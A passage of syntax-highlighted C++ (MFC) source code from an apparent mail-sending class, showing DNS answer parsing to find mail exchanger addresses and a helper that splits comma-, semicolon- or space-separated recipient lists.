                                </span><span class="sc11">AppendResult</span><span class="sc10">(</span><span class="sc11">nResourceType</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">nType</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">inet_ntoa</span><span class="sc10">(</span><span class="sc11">inaddr</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc11">szFoundNames</span><span class="sc10">);</span><span class="sc0">

                                </span><span class="sc2">// TODO: return protocol and port
</span><span class="sc0">                            </span><span class="sc10">}</span><span class="sc0">
                            </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
                        </span><span class="sc5">default</span><span class="sc10">:</span><span class="sc0">
                            </span><span class="sc11">TRACE</span><span class="sc10">(</span><span class="sc6">"\taddress, class = %d, len = %d\n"</span><span class="sc10">,</span><span class="sc0">
                                </span><span class="sc11">nClass</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">nDataLength</span><span class="sc10">);</span><span class="sc0">
                            </span><span class="sc2">// TODO: handle unknown class for type T_A
</span><span class="sc0">                        </span><span class="sc10">}</span><span class="sc0">
                        </span><span class="sc11">pCurrentData</span><span class="sc10">+=</span><span class="sc11">nDataLength</span><span class="sc10">;</span><span class="sc0">
                    </span><span class="sc10">}</span><span class="sc0">
                    </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">

                </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc11">T_MX</span><span class="sc10">:</span><span class="sc0">
                    </span><span class="sc10">{</span><span class="sc0">
                        </span><span class="sc2">// Mail eXchanger
</span><span class="sc0">                        </span><span class="sc11">TRACE</span><span class="sc10">(</span><span class="sc6">"\tpreference = %u"</span><span class="sc10">,</span><span class="sc11">getshort</span><span class="sc10">((</span><span class="sc11">u_char</span><span class="sc10">*)</span><span class="sc11">pCurrentData</span><span class="sc10">));</span><span class="sc0">
                        </span><span class="sc11">pCurrentData</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">INT16SZ</span><span class="sc10">;</span><span class="sc0">
                        </span><span class="sc11">TRACE</span><span class="sc10">(</span><span class="sc6">"\tmail exchanger = \"%s\"\n"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">pCurrentData</span><span class="sc10">);</span><span class="sc0">
                        </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">n</span><span class="sc10">;</span><span class="sc0">
                        </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">name</span><span class="sc10">[</span><span class="sc11">MAXDNAME</span><span class="sc10">];</span><span class="sc0">

                        </span><span class="sc11">n</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">dn_expand</span><span class="sc10">(</span><span class="sc11">oDNSAnswer</span><span class="sc10">.</span><span class="sc11">buf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">pEndOfMessage</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">pCurrentData</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">name</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">name</span><span class="sc10">));</span><span class="sc0">
                        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">n</span><span class="sc0"> </span><span class="sc10">&gt;=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                            </span><span class="sc11">AppendResult</span><span class="sc10">(</span><span class="sc11">nResourceType</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">nType</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">name</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">szFoundNames</span><span class="sc10">);</span><span class="sc0">
                            </span><span class="sc11">pCurrentData</span><span class="sc10">+=</span><span class="sc11">n</span><span class="sc10">;</span><span class="sc0">
                        </span><span class="sc10">}</span><span class="sc0">
                    </span><span class="sc10">}</span><span class="sc0">
                    </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">

                </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc11">T_CNAME</span><span class="sc10">:</span><span class="sc0">
                    </span><span class="sc11">TRACE</span><span class="sc10">(</span><span class="sc6">"\tcanonical name = \""</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc10">{</span><span class="sc0">
                        </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">n</span><span class="sc10">;</span><span class="sc0">
                        </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">name</span><span class="sc10">[</span><span class="sc11">MAXDNAME</span><span class="sc10">];</span><span class="sc0">

                        </span><span class="sc11">n</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">dn_expand</span><span class="sc10">(</span><span class="sc11">oDNSAnswer</span><span class="sc10">.</span><span class="sc11">buf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">pEndOfMessage</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">pCurrentData</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">name</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">name</span><span class="sc10">));</span><span class="sc0">
                        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">n</span><span class="sc0"> </span><span class="sc10">&gt;=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                            </span><span class="sc11">TRACE</span><span class="sc10">(</span><span class="sc6">"%s"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">name</span><span class="sc10">);</span><span class="sc0">
                            </span><span class="sc11">AppendResult</span><span class="sc10">(</span><span class="sc11">nResourceType</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">nType</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">name</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">szFoundNames</span><span class="sc10">);</span><span class="sc0">
                            </span><span class="sc11">pCurrentData</span><span class="sc10">+=</span><span class="sc11">n</span><span class="sc10">;</span><span class="sc0">
                        </span><span class="sc10">}</span><span class="sc0">
                    </span><span class="sc10">}</span><span class="sc0">
                    </span><span class="sc11">TRACE</span><span class="sc10">(</span><span class="sc6">"\"\n"</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">

                </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc11">T_NS</span><span class="sc10">:</span><span class="sc0">
                    </span><span class="sc11">TRACE</span><span class="sc10">(</span><span class="sc6">"\tnameserver = \""</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc10">{</span><span class="sc0">
                        </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">n</span><span class="sc10">;</span><span class="sc0">
                        </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">name</span><span class="sc10">[</span><span class="sc11">MAXDNAME</span><span class="sc10">];</span><span class="sc0">

                        </span><span class="sc11">n</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">dn_expand</span><span class="sc10">(</span><span class="sc11">oDNSAnswer</span><span class="sc10">.</span><span class="sc11">buf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">pEndOfMessage</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">pCurrentData</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">name</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">name</span><span class="sc10">));</span><span class="sc0">
                        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">n</span><span class="sc0"> </span><span class="sc10">&gt;=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                            </span><span class="sc11">AppendResult</span><span class="sc10">(</span><span class="sc11">nResourceType</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">nType</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">name</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">szFoundNames</span><span class="sc10">);</span><span class="sc0">
                            </span><span class="sc11">pCurrentData</span><span class="sc10">+=</span><span class="sc11">n</span><span class="sc10">;</span><span class="sc0">
                        </span><span class="sc10">}</span><span class="sc0">
                    </span><span class="sc10">}</span><span class="sc0">
                    </span><span class="sc11">TRACE</span><span class="sc10">(</span><span class="sc6">"\"\n"</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">

                </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc11">T_PTR</span><span class="sc10">:</span><span class="sc0">
                    </span><span class="sc11">TRACE</span><span class="sc10">(</span><span class="sc6">"\tname = \""</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc10">{</span><span class="sc0">
                        </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">n</span><span class="sc10">;</span><span class="sc0">
                        </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">name</span><span class="sc10">[</span><span class="sc11">MAXDNAME</span><span class="sc10">];</span><span class="sc0">

                        </span><span class="sc11">n</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">dn_expand</span><span class="sc10">(</span><span class="sc11">oDNSAnswer</span><span class="sc10">.</span><span class="sc11">buf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">pEndOfMessage</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">pCurrentData</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">name</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">name</span><span class="sc10">));</span><span class="sc0">
                        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">n</span><span class="sc0"> </span><span class="sc10">&gt;=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                            </span><span class="sc11">AppendResult</span><span class="sc10">(</span><span class="sc11">nResourceType</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">nType</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">name</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">szFoundNames</span><span class="sc10">);</span><span class="sc0">
                            </span><span class="sc11">pCurrentData</span><span class="sc10">+=</span><span class="sc11">n</span><span class="sc10">;</span><span class="sc0">
                        </span><span class="sc10">}</span><span class="sc0">
                    </span><span class="sc10">}</span><span class="sc0">
                    </span><span class="sc11">TRACE</span><span class="sc10">(</span><span class="sc6">"\"\n"</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">

                </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc11">T_MG</span><span class="sc10">:</span><span class="sc0">
                    </span><span class="sc2">// TODO: handle this type
</span><span class="sc0">                    </span><span class="sc11">pCurrentData</span><span class="sc10">+=</span><span class="sc11">nDataLength</span><span class="sc10">;</span><span class="sc0">
                    </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">

                </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc11">T_MB</span><span class="sc10">:</span><span class="sc0">
                    </span><span class="sc2">// TODO: handle this type
</span><span class="sc0">                    </span><span class="sc11">pCurrentData</span><span class="sc10">+=</span><span class="sc11">nDataLength</span><span class="sc10">;</span><span class="sc0">
                    </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">

                </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc11">T_MR</span><span class="sc10">:</span><span class="sc0">
                    </span><span class="sc2">// TODO: handle this type
</span><span class="sc0">                    </span><span class="sc11">pCurrentData</span><span class="sc10">+=</span><span class="sc11">nDataLength</span><span class="sc10">;</span><span class="sc0">
                    </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">

                </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc11">T_NAPTR</span><span class="sc10">:</span><span class="sc0"> 
                    </span><span class="sc2">// TODO: handle this type
</span><span class="sc0">                    </span><span class="sc11">pCurrentData</span><span class="sc10">+=</span><span class="sc11">nDataLength</span><span class="sc10">;</span><span class="sc0">
                    </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">

                </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc11">T_SRV</span><span class="sc10">:</span><span class="sc0"> 
                    </span><span class="sc2">// TODO: handle this type
</span><span class="sc0">                    </span><span class="sc11">pCurrentData</span><span class="sc10">+=</span><span class="sc11">nDataLength</span><span class="sc10">;</span><span class="sc0">
                    </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">

                </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc11">T_RT</span><span class="sc10">:</span><span class="sc0">
                    </span><span class="sc2">// TODO: handle this type
</span><span class="sc0">                    </span><span class="sc11">pCurrentData</span><span class="sc10">+=</span><span class="sc11">nDataLength</span><span class="sc10">;</span><span class="sc0">
                    </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">

                </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc11">T_AFSDB</span><span class="sc10">:</span><span class="sc0">
                    </span><span class="sc2">// TODO: handle this type
</span><span class="sc0">                    </span><span class="sc11">pCurrentData</span><span class="sc10">+=</span><span class="sc11">nDataLength</span><span class="sc10">;</span><span class="sc0">
                    </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">

                </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc11">T_HINFO</span><span class="sc10">:</span><span class="sc0">
                    </span><span class="sc2">// TODO: handle this type
</span><span class="sc0">                    </span><span class="sc11">pCurrentData</span><span class="sc10">+=</span><span class="sc11">nDataLength</span><span class="sc10">;</span><span class="sc0">
                    </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">

                </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc11">T_ISDN</span><span class="sc10">:</span><span class="sc0">
                    </span><span class="sc2">// TODO: handle this type
</span><span class="sc0">                    </span><span class="sc11">pCurrentData</span><span class="sc10">+=</span><span class="sc11">nDataLength</span><span class="sc10">;</span><span class="sc0">
                    </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">

                </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc11">T_SOA</span><span class="sc10">:</span><span class="sc0">
                    </span><span class="sc2">// TODO: handle this type
</span><span class="sc0">                    </span><span class="sc11">pCurrentData</span><span class="sc10">+=</span><span class="sc11">nDataLength</span><span class="sc10">;</span><span class="sc0">
                    </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">

                </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc11">T_MINFO</span><span class="sc10">:</span><span class="sc0">
                    </span><span class="sc2">// TODO: handle this type
</span><span class="sc0">                    </span><span class="sc11">pCurrentData</span><span class="sc10">+=</span><span class="sc11">nDataLength</span><span class="sc10">;</span><span class="sc0">
                    </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">

                </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc11">T_RP</span><span class="sc10">:</span><span class="sc0">
                    </span><span class="sc2">// TODO: handle this type
</span><span class="sc0">                    </span><span class="sc11">pCurrentData</span><span class="sc10">+=</span><span class="sc11">nDataLength</span><span class="sc10">;</span><span class="sc0">
                    </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">

                </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc11">T_TXT</span><span class="sc10">:</span><span class="sc0">
                    </span><span class="sc2">// TODO: handle this type
</span><span class="sc0">                    </span><span class="sc11">pCurrentData</span><span class="sc10">+=</span><span class="sc11">nDataLength</span><span class="sc10">;</span><span class="sc0">
                    </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">

                </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc11">T_X25</span><span class="sc10">:</span><span class="sc0">
                    </span><span class="sc2">// TODO: handle this type
</span><span class="sc0">                    </span><span class="sc11">pCurrentData</span><span class="sc10">+=</span><span class="sc11">nDataLength</span><span class="sc10">;</span><span class="sc0">
                    </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">

                </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc11">T_NSAP</span><span class="sc10">:</span><span class="sc0">
                    </span><span class="sc2">// TODO: handle this type
</span><span class="sc0">                    </span><span class="sc11">pCurrentData</span><span class="sc10">+=</span><span class="sc11">nDataLength</span><span class="sc10">;</span><span class="sc0">
                    </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">

                </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc11">T_AAAA</span><span class="sc10">:</span><span class="sc0"> 
                    </span><span class="sc2">// TODO: handle this type
</span><span class="sc0">                    </span><span class="sc11">pCurrentData</span><span class="sc10">+=</span><span class="sc11">nDataLength</span><span class="sc10">;</span><span class="sc0">
                    </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">

                </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc11">T_UINFO</span><span class="sc10">:</span><span class="sc0">
                    </span><span class="sc2">// TODO: handle this type
</span><span class="sc0">                    </span><span class="sc11">pCurrentData</span><span class="sc10">+=</span><span class="sc11">nDataLength</span><span class="sc10">;</span><span class="sc0">
                    </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">

                </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc11">T_UID</span><span class="sc10">:</span><span class="sc0">
                    </span><span class="sc2">// TODO: handle this type
</span><span class="sc0">                    </span><span class="sc11">pCurrentData</span><span class="sc10">+=</span><span class="sc11">nDataLength</span><span class="sc10">;</span><span class="sc0">
                    </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">

                </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc11">T_GID</span><span class="sc10">:</span><span class="sc0">
                    </span><span class="sc2">// TODO: handle this type
</span><span class="sc0">                    </span><span class="sc11">pCurrentData</span><span class="sc10">+=</span><span class="sc11">nDataLength</span><span class="sc10">;</span><span class="sc0">
                    </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">

                </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc11">T_WKS</span><span class="sc10">:</span><span class="sc0">
                    </span><span class="sc2">// TODO: handle this type
</span><span class="sc0">                    </span><span class="sc11">pCurrentData</span><span class="sc10">+=</span><span class="sc11">nDataLength</span><span class="sc10">;</span><span class="sc0">
                    </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">

                </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc11">T_NULL</span><span class="sc10">:</span><span class="sc0">
                    </span><span class="sc2">// TODO: handle this type
</span><span class="sc0">                    </span><span class="sc11">pCurrentData</span><span class="sc10">+=</span><span class="sc11">nDataLength</span><span class="sc10">;</span><span class="sc0">
                    </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">

                </span><span class="sc5">default</span><span class="sc10">:</span><span class="sc0">
                    </span><span class="sc2">// TODO: handle this type
</span><span class="sc0">                    </span><span class="sc11">pCurrentData</span><span class="sc10">+=</span><span class="sc11">nDataLength</span><span class="sc10">;</span><span class="sc0">
                    </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">

                </span><span class="sc2">////////////////
</span><span class="sc0">                </span><span class="sc2">// Next answer
</span><span class="sc0">                </span><span class="sc2">////////////////
</span><span class="sc0">
                </span><span class="sc2">// skip the name
</span><span class="sc0">                </span><span class="sc11">pCurrentData</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">SkipName</span><span class="sc10">(</span><span class="sc11">oDNSAnswer</span><span class="sc10">.</span><span class="sc11">buf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">pCurrentData</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">pEndOfMessage</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc2">// extract the type, class, TTL and data length of next answer
</span><span class="sc0">                </span><span class="sc11">GETSHORT</span><span class="sc10">(</span><span class="sc11">nType</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">pCurrentData</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">GETSHORT</span><span class="sc10">(</span><span class="sc11">nClass</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">pCurrentData</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">GETLONG</span><span class="sc10">(</span><span class="sc11">nTimeToLive</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">pCurrentData</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">GETSHORT</span><span class="sc10">(</span><span class="sc11">nDataLength</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">pCurrentData</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">cp</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">pCurrentData</span><span class="sc10">;</span><span class="sc0">

            </span><span class="sc10">}</span><span class="sc0">

            </span><span class="sc11">hReturnCode</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">S_OK</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">

    </span><span class="sc11">SMTPAddress</span><span class="sc10">=</span><span class="sc11">szFoundNames</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">hReturnCode</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc11">BOOL</span><span class="sc0"> </span><span class="sc11">CSendMessage</span><span class="sc10">::</span><span class="sc11">BuildListFromString</span><span class="sc10">(</span><span class="sc11">LPCTSTR</span><span class="sc0"> </span><span class="sc11">lpszStringWithSeparators</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">CStringList</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">oList</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">CString</span><span class="sc0"> </span><span class="sc11">szStringWithSeparators</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">lpszStringWithSeparators</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">TCHAR</span><span class="sc0"> </span><span class="sc11">cSeparator</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc7">','</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">nPos</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">oList</span><span class="sc10">.</span><span class="sc11">RemoveAll</span><span class="sc10">();</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">nCurrentPos</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">nCurrentLength</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">CString</span><span class="sc0"> </span><span class="sc11">szCurrentItem</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc11">nPos</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">szStringWithSeparators</span><span class="sc10">.</span><span class="sc11">Find</span><span class="sc10">(</span><span class="sc11">cSeparator</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">nPos</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc2">// Try semi-colon
</span><span class="sc0">        </span><span class="sc11">cSeparator</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc7">';'</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">nPos</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">szStringWithSeparators</span><span class="sc10">.</span><span class="sc11">Find</span><span class="sc10">(</span><span class="sc11">cSeparator</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">nPos</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc2">// Try space
</span><span class="sc0">            </span><span class="sc11">cSeparator</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc7">' '</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">nPos</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">szStringWithSeparators</span><span class="sc10">.</span><span class="sc11">Find</span><span class="sc10">(</span><span class="sc11">cSeparator</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">nPos</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">nCurrentLength</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">nPos</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc11">nCurrentPos</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">szCurrentItem</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">szStringWithSeparators</span><span class="sc10">.</span><span class="sc11">Mid</span><span class="sc10">(</span><span class="sc11">nCurrentPos</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">nCurrentLength</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc2">// Remove starting/trailing spaces
</span><span class="sc0">        </span><span class="sc11">szCurrentItem</span><span class="sc10">.</span><span class="sc11">TrimLeft</span><span class="sc10">(</span><span class="sc6">" "</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">szCurrentItem</span><span class="sc10">.</span><span class="sc11">TrimRight</span><span class="sc10">(</span><span class="sc6">" "</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">szCurrentItem</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc6">""</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">TRACE1</span><span class="sc10">(</span><span class="sc6">"Adding string \"%s\"\n"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">szCurrentItem</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">oList</span><span class="sc10">.</span><span class="sc11">AddTail</span><span class="sc10">(</span><span class="sc11">szCurrentItem</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc11">nCurrentPos</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">nPos</span><span class="sc10">+</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">nPos</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">szStringWithSeparators</span><span class="sc10">.</span><span class="sc11">Find</span><span class="sc10">(</span><span class="sc11">cSeparator</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">nCurrentPos</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc2">// Add last item
</span><span class="sc0">    </span><span class="sc11">szCurrentItem</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">szStringWithSeparators</span><span class="sc10">.</span><span class="sc11">Mid</span><span class="sc10">(</span><span class="sc11">nCurrentPos</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc2">// Remove starting/trailing spaces
</span><span class="sc0">    </span><span class="sc11">szCurrentItem</span><span class="sc10">.</span><span class="sc11">TrimLeft</span><span class="sc10">(</span><span class="sc6">" "</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">szCurrentItem</span><span class="sc10">.</span><span class="sc11">TrimRight</span><span class="sc10">(</span><span class="sc6">" "</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">szCurrentItem</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc6">""</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">TRACE1</span><span class="sc10">(</span><span class="sc6">"Adding string \"%s\"\n"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">szCurrentItem</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">oList</span><span class="sc10">.</span><span class="sc11">AddTail</span><span class="sc10">(</span><span class="sc11">szCurrentItem</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    

    </span><span class="sc5">return</span><span class="sc10">(!</span><span class="sc11">oList</span><span class="sc10">.</span><span class="sc11">IsEmpty</span><span class="sc10">());</span><span class="sc0">
